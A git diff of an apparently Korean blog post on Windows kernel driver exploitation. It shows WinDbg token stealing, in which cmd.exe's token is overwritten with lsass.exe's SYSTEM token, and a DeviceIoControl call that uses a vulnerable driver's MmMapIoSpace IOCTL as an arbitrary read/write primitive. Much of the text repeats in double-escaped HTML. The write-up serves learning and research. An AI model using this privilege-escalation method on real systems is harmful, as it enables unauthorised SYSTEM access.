&amp;#xAD00;&amp;#xB9AC;&amp;#xD558;&amp;#xACE0;, &amp;#xC561;&amp;#xC138;&amp;#xC2A4; &amp;#xD1A0;&amp;#xD070;&amp;#xC744; &amp;#xC0DD;&amp;#xC131;&amp;#xD55C;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; Windows Security Log&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD55C;&amp;#xB2E4;.&lt;br&gt;(&amp;#xB531; &amp;#xBD10;&amp;#xB3C4; &amp;#xCEE4;&amp;#xB110; &amp;#xAD8C;&amp;#xD55C;&amp;#xC73C;&amp;#xB85C; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xB294; &amp;#xB9E4;&amp;#xC6B0; &amp;#xB9E4;&amp;#xC6B0; &amp;#xC911;&amp;#xC694;&amp;#xD55C; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; &amp;#xAC19;&amp;#xC544; &amp;#xBCF4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;&amp;#x314E;&amp;#x314E;)&lt;/p&gt;
@@ -243,6 +261,7 @@ PROCESS ffffe405af71c0c0
    +&lt;span class=&#34;hljs-number&#34;&gt;0x5a8&lt;/span&gt; ImageFileName   : [&lt;span class=&#34;hljs-number&#34;&gt;15&lt;/span&gt;]  &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;lsass.exe&amp;quot;&lt;/span&gt;
 
 * &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC740; &amp;#xC708;&amp;#xB3C4;&amp;#xC6B0; &amp;#xBE4C;&amp;#xB4DC; &amp;#xBC84;&amp;#xC804;&amp;#xBCC4; &amp;#xC0C1;&amp;#xC774;&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&amp;#xC6B0;&amp;#xC120;&amp;#xC740; &amp;#xD574;&amp;#xB2F9; &amp;#xD544;&amp;#xB4DC;&amp;#xB4E4;&amp;#xC758; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC744; &amp;#xAE30;&amp;#xC5B5;&amp;#xD558;&amp;#xC2DC;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xC81C; &amp;#xD558;&amp;#xB098;&amp;#xC529; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xC8E0;!&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;UniqueProcessId&lt;/code&gt; : &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; ID(PID)&lt;/li&gt;
@@ -257,6 +276,7 @@ PROCESS ffffe405af71c0c0
     [+&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt;] Object           : &lt;span class=&#34;hljs-number&#34;&gt;0xffff990bec2356bc&lt;/span&gt; [Type: &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *]
     [+&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; ( &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)] RefCnt           : &lt;span class=&#34;hljs-number&#34;&gt;0xc&lt;/span&gt; [Type: &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64]
     [+&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt;] Value            : &lt;span class=&#34;hljs-number&#34;&gt;0xffff990bec2356bc&lt;/span&gt; [Type: &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64]&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;&lt;code&gt;Value&lt;/code&gt; &amp;#xD544;&amp;#xB4DC;&amp;#xAC00; &amp;#xBC14;&amp;#xB85C; &amp;#xAD8C;&amp;#xD55C; &amp;#xC2DD;&amp;#xBCC4; &amp;#xAC12;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5B4;&amp;#xB5A0;&amp;#xD55C; &amp;#xAD8C;&amp;#xD55C;&amp;#xC774; &amp;#xC8FC;&amp;#xC5B4;&amp;#xC9C4; Token Value&amp;#xC778;&amp;#xC9C0;&amp;#xB294; &lt;code&gt;!token [Value &amp;amp; 0xffffffffffffffff0]&lt;/code&gt;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xD558;&amp;#xC704; 4bit&amp;#xB97C; 0&amp;#xC73C;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4; &amp;#xD655;&amp;#xC778;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; !token &lt;span class=&#34;hljs-number&#34;&gt;0xffff990bec2356b0&lt;/span&gt;
 _TOKEN &lt;span class=&#34;hljs-number&#34;&gt;0xffff990bec2356b0&lt;/span&gt;
@@ -283,6 +303,7 @@ Privs:
  &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x00000000a&lt;/span&gt; SeLoadDriverPrivilege             Attributes - 
  &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x00000000b&lt;/span&gt; SeSystemProfilePrivilege          Attributes - Enabled Default
 ...&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;User&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &lt;code&gt;S-1-5-18&lt;/code&gt; &amp;#xB85C; &amp;#xD45C;&amp;#xC2DC;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB97C; SID(Security Identifier)&amp;#xB77C;&amp;#xACE0; &amp;#xD558;&amp;#xBA70;, &amp;#xAC01; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xC758; SID&amp;#xB294; &lt;a href=&#34;https://renenyffenegger.ch/notes/Windows/security/SID/index&#34;&gt;https://renenyffenegger.ch/notes/Windows/security/SID/index&lt;/a&gt; &amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;/2021/07/28/l0ch/windows-driver-part3/Untitled%201.png&#34; alt=&#34;windows-driver-part3/Untitled%201.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt; &amp;#xACC4;&amp;#xC815;&amp;#xC758; &amp;#xAD8C;&amp;#xD55C;&amp;#xC778; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB124;&amp;#xC694;!&lt;/p&gt;
@@ -317,18 +338,27 @@ PROCESS ffffe405b50d1080
     [+&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt;] Object           : &lt;span class=&#34;hljs-number&#34;&gt;0xffff990bf7037067&lt;/span&gt; [Type: &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *]
     [+&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; ( &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)] RefCnt           : &lt;span class=&#34;hljs-number&#34;&gt;0x7&lt;/span&gt; [Type: &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64]
     [+&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt;] Value            : &lt;span class=&#34;hljs-number&#34;&gt;0xffff990bf7037067&lt;/span&gt; [Type: &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64]&lt;/code&gt;&lt;/pre&gt;
+
+
+
 &lt;p&gt;Token&amp;#xC758; &amp;#xC704;&amp;#xCE58;&amp;#xB294; &lt;code&gt;ffffe405b50d1080 + 4b8 = ffffe405b50d1538&lt;/code&gt; &amp;#xC774; &amp;#xB418;&amp;#xACA0;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; dps FFFFE405B50D1538
 ffffe405`b50d1538  ffff990b`f7037067
 ffffe405`b50d1540  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
 ffffe405`b50d1548  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
 ffffe405`b50d1550  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+
+
 &lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC774; Token Value&amp;#xB97C; Windbg&amp;#xC758; memory edit&amp;#xAE30;&amp;#xB2A5;&amp;#xC73C;&amp;#xB85C; &amp;#xC544;&amp;#xAE4C; &lt;code&gt;lsass.exe&lt;/code&gt;&amp;#xC758; Token Value&amp;#xC778; &lt;code&gt;0xffff990bec2356bc&lt;/code&gt;&amp;#xB85C; &amp;#xBC14;&amp;#xAFC9;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; eq FFFFE405B50D1538 &lt;span class=&#34;hljs-number&#34;&gt;0xffff990bec2356bc&lt;/span&gt;
 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; dps FFFFE405B50D1538
 ffffe405`b50d1538  ffff990b`ec2356bc
 ffffe405`b50d1540  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
 ffffe405`b50d1548  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+
+
 &lt;p&gt;&amp;#xB2E4;&amp;#xC2DC; &amp;#xB514;&amp;#xBC84;&amp;#xAE30; &amp;#xBA38;&amp;#xC2E0;&amp;#xC73C;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xAC00; &lt;code&gt;cmd.exe&lt;/code&gt;&amp;#xC758; &amp;#xACC4;&amp;#xC815;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;nt authority\system&lt;/code&gt; &amp;#xC73C;&amp;#xB85C; &amp;#xBC14;&amp;#xB010; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;/2021/07/28/l0ch/windows-driver-part3/Untitled%203.png&#34; alt=&#34;windows-driver-part3/Untitled%203.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;/2021/07/28/l0ch/windows-driver-part3/Untitled%204.png&#34; alt=&#34;windows-driver-part3/Untitled%204.png&#34;&gt;&lt;/p&gt;
@@ -574,6 +604,7 @@ ffffe405`b50d1548  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
 <span class="hljs-comment">// 0x0000000000000001</span>
 
 DeviceIoControl(dHandle, <span class="hljs-number">0x81112F08</span>, input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>))</code></pre>
+
 <p><img src="/2021/07/28/l0ch/windows-driver-part3/2.png" srcset="/img/loading.gif" alt="windows-driver-part3/2.png"></p>
 <p>input buffer&#xC758; <code>0x4141414141414141</code>&#xACFC; <code>0x00000001</code>&#xC774; <code>sub_1400063D0</code>&#xC758; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xCC28;&#xB840;&#xB300;&#xB85C; &#xB4E4;&#xC5B4;&#xAC04; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB124;&#xC694;. <del>&#xB09C; &#xC800; 0x41414141 &#xBCFC; &#xB54C; &#xAE30;&#xBD84;&#xC774; &#xC81C;&#xC77C; &#xC88B;&#xB354;&#xB77C;</del>  &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xB2E4;&#xC2DC; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled.png" srcset="/img/loading.gif" alt="windows-driver-part3/Untitled.png"></p>
@@ -586,6 +617,7 @@ DeviceIoControl(dHandle, <span class="hljs-number">0x81112F08</span>, input_buff
     INT64 read_addr; 
     DWORD num_of_bytes;
 } READ_INPUT_BUFFER;</code></pre>
+
 <p><code>0x81112F08</code>&#xC758; input buffer structure&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xAD6C;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p>&#xC774;&#xC81C; user input&#xC744; &#xD1B5;&#xD574; <code>0x81112F08</code> &#xB8E8;&#xD2F4;&#xC758; <code>MmMapIoSpace</code>&#xC5D0; &#xC784;&#xC758;&#xC758; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xC640; &#xB9E4;&#xD551; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xC904; &#xC218; &#xC788;&#xACE0; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC5B4; arbitrary read&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xBC18;&#xB300;&#xB85C; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xC5D0; &#xAC12;&#xC744; &#xC4F0;&#xB294; <code>0x81112F0C</code> &#xC758; &#xB8E8;&#xD2F4;&#xB3C4; &#xB3D9;&#xC77C;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xC5D0; &#xC6B0;&#xB9AC;&#xAC00; &#xC784;&#xC758;&#xC758; &#xAC12;&#xC744; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
 <p>arbitrary read/write primitive&#xB97C; &#xBAA8;&#xB450; &#xC5BB;&#xC5C8;&#xB124;&#xC694;! &#xC774;&#xC81C; &#xC774;&#xAC78; &#xC774;&#xC6A9;&#xD574; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p>
@@ -611,6 +643,7 @@ PROCESS ffffe405af71c0c0
     Image: lsass.exe
 ..
 </code></pre>
+
 <p>&#xD604;&#xC7AC; &#xB514;&#xBC84;&#xAE30; &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xB3CC;&#xC544;&#xAC00;&#xB294; &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB9AC;&#xC2A4;&#xD2B8;&#xAC00; &#xB739;&#xB2C8;&#xB2E4;. &#xB108;&#xBB34; &#xB9CE;&#xC73C;&#xB2C8;.. &#xBA87; &#xAC1C; &#xB098;&#xC624;&#xBA74; &#xC911;&#xB2E8;&#xD558;&#xACE0;, <code>lsass.exe</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC608;&#xC2DC;&#xB85C; &#xB4E4;&#xC5B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.  </p>
 <blockquote>
 <p>lsass.exe : &#xB85C;&#xCEEC; &#xBCF4;&#xC548; &#xC778;&#xC99D; &#xD558;&#xC704; &#xC2DC;&#xC2A4;&#xD15C; &#xC11C;&#xBE44;&#xC2A4;. &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC744; &#xAC15;&#xD654;&#xB97C; &#xC704;&#xD55C; &#xC708;&#xB3C4;&#xC6B0;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC774;&#xB2E4;. &#xC774;&#xAC83;&#xC740; &#xC708;&#xB3C4;&#xC6B0; &#xCEF4;&#xD4E8;&#xD130;&#xB098; &#xC11C;&#xBC84;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xB294; &#xC720;&#xC800;&#xB4E4;&#xC758; &#xB85C;&#xADF8;&#xC778;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xBA70;, &#xBE44;&#xBC00;&#xBC88;&#xD638; &#xBCC0;&#xACBD;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xACE0;, &#xC561;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC744; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;. &#xB610;&#xD55C; Windows Security Log&#xB97C; &#xC791;&#xC131;&#xD55C;&#xB2E4;.<br>(&#xB531; &#xBD10;&#xB3C4; &#xCEE4;&#xB110; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xB9E4;&#xC6B0; &#xB9E4;&#xC6B0; &#xC911;&#xC694;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC19;&#xC544; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;&#x314E;&#x314E;)</p>
@@ -622,6 +655,7 @@ PROCESS ffffe405af71c0c0
    +<span class="hljs-number">0x5a8</span> ImageFileName   : [<span class="hljs-number">15</span>]  <span class="hljs-string">&quot;lsass.exe&quot;</span>
 
 * &#xC624;&#xD504;&#xC14B;&#xC740; &#xC708;&#xB3C4;&#xC6B0; &#xBE4C;&#xB4DC; &#xBC84;&#xC804;&#xBCC4; &#xC0C1;&#xC774;</code></pre>
+
 <p>&#xC6B0;&#xC120;&#xC740; &#xD574;&#xB2F9; &#xD544;&#xB4DC;&#xB4E4;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xAE30;&#xC5B5;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xD558;&#xB098;&#xC529; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;!</p>
 <ul>
 <li><code>UniqueProcessId</code> : &#xD504;&#xB85C;&#xC138;&#xC2A4; ID(PID)</li>
@@ -636,6 +670,7 @@ PROCESS ffffe405af71c0c0
     [+<span class="hljs-number">0x000</span>] Object           : <span class="hljs-number">0xffff990bec2356bc</span> [Type: <span class="hljs-keyword">void</span> *]
     [+<span class="hljs-number">0x000</span> ( <span class="hljs-number">3</span>: <span class="hljs-number">0</span>)] RefCnt           : <span class="hljs-number">0xc</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]
     [+<span class="hljs-number">0x000</span>] Value            : <span class="hljs-number">0xffff990bec2356bc</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]</code></pre>
+
 <p><code>Value</code> &#xD544;&#xB4DC;&#xAC00; &#xBC14;&#xB85C; &#xAD8C;&#xD55C; &#xC2DD;&#xBCC4; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. &#xC5B4;&#xB5A0;&#xD55C; &#xAD8C;&#xD55C;&#xC774; &#xC8FC;&#xC5B4;&#xC9C4; Token Value&#xC778;&#xC9C0;&#xB294; <code>!token [Value &amp; 0xffffffffffffffff0]</code>&#xC640; &#xAC19;&#xC774; &#xD558;&#xC704; 4bit&#xB97C; 0&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; !token <span class="hljs-number">0xffff990bec2356b0</span>
 _TOKEN <span class="hljs-number">0xffff990bec2356b0</span>
@@ -662,6 +697,7 @@ Privs:
  <span class="hljs-number">10</span> <span class="hljs-number">0x00000000a</span> SeLoadDriverPrivilege             Attributes - 
  <span class="hljs-number">11</span> <span class="hljs-number">0x00000000b</span> SeSystemProfilePrivilege          Attributes - Enabled Default
 ...</code></pre>
+
 <p>User&#xB97C; &#xBCF4;&#xBA74; <code>S-1-5-18</code> &#xB85C; &#xD45C;&#xC2DC;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; SID(Security Identifier)&#xB77C;&#xACE0; &#xD558;&#xBA70;, &#xAC01; &#xC0AC;&#xC6A9;&#xC790;&#xC758; SID&#xB294; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://renenyffenegger.ch/notes/Windows/security/SID/index">https://renenyffenegger.ch/notes/Windows/security/SID/index</a> &#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%201.png" srcset="/img/loading.gif" alt="windows-driver-part3/Untitled%201.png"></p>
 <p><code>NT AUTHORITY\SYSTEM</code> &#xACC4;&#xC815;&#xC758; &#xAD8C;&#xD55C;&#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB124;&#xC694;!</p>
@@ -696,18 +732,27 @@ PROCESS ffffe405b50d1080
     [+<span class="hljs-number">0x000</span>] Object           : <span class="hljs-number">0xffff990bf7037067</span> [Type: <span class="hljs-keyword">void</span> *]
     [+<span class="hljs-number">0x000</span> ( <span class="hljs-number">3</span>: <span class="hljs-number">0</span>)] RefCnt           : <span class="hljs-number">0x7</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]
     [+<span class="hljs-number">0x000</span>] Value            : <span class="hljs-number">0xffff990bf7037067</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]</code></pre>
+
+
+
 <p>Token&#xC758; &#xC704;&#xCE58;&#xB294; <code>ffffe405b50d1080 + 4b8 = ffffe405b50d1538</code> &#xC774; &#xB418;&#xACA0;&#xB124;&#xC694;.</p>
 <pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; dps FFFFE405B50D1538
 ffffe405`b50d1538  ffff990b`f7037067
 ffffe405`b50d1540  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>
 ffffe405`b50d1548  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>
 ffffe405`b50d1550  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span></code></pre>
+
+
+
 <p>&#xC774;&#xC81C; &#xC774; Token Value&#xB97C; Windbg&#xC758; memory edit&#xAE30;&#xB2A5;&#xC73C;&#xB85C; &#xC544;&#xAE4C; <code>lsass.exe</code>&#xC758; Token Value&#xC778; <code>0xffff990bec2356bc</code>&#xB85C; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; eq FFFFE405B50D1538 <span class="hljs-number">0xffff990bec2356bc</span>
 <span class="hljs-number">0</span>: kd&gt; dps FFFFE405B50D1538
 ffffe405`b50d1538  ffff990b`ec2356bc
 ffffe405`b50d1540  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>
 ffffe405`b50d1548  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span></code></pre>
+
+
+
 <p>&#xB2E4;&#xC2DC; &#xB514;&#xBC84;&#xAE30; &#xBA38;&#xC2E0;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xAC00; <code>cmd.exe</code>&#xC758; &#xACC4;&#xC815;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>nt authority\system</code> &#xC73C;&#xB85C; &#xBC14;&#xB010; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
 <p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%203.png" srcset="/img/loading.gif" alt="windows-driver-part3/Untitled%203.png"></p>
 <p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%204.png" srcset="/img/loading.gif" alt="windows-driver-part3/Untitled%204.png"></p>
@@ -734,11 +779,11 @@ ffffe405`b50d1548  <span class="hljs-number">00000000</span>`<span class="hljs-n
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/lpe/">lpe</a>
-                  
                   <a class="hover-with-bg" href="/tags/windows/">windows</a>
                   
                   <a class="hover-with-bg" href="/tags/kernel/">kernel</a>
+                  
+                  <a class="hover-with-bg" href="/tags/lpe/">lpe</a>
                   
                   <a class="hover-with-bg" href="/tags/L0ch/">L0ch</a>
                   
